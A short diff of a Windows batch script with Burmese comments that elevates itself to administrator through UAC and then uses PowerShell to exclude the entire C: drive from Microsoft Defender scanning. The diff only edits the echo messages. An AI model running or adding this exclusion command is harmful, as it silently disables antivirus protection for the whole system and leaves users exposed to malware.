@@ -2,7 +2,7 @@
 :: Administrator ဟုတ်မဟုတ် စစ်ဆေးပြီး မဟုတ်ပါက Admin ဖြင့် ပြန်ဖွင့်ရန်
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 if '%errorlevel%' NEQ '0' (
-    echo Administrator ဖြင့် Run နေပါပြီ...
+    echo Administrator 
     goto UACPrompt
 ) else ( goto gotAdmin )
 
@@ -22,5 +22,5 @@ CD /D "%~dp0"
 :: ---------------------------------------------------------
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
 
-echo Exclusion ထည့်သွင်းခြင်း ပြီးဆုံးပါပြီ။
+echo Exclusion Complete
 pause
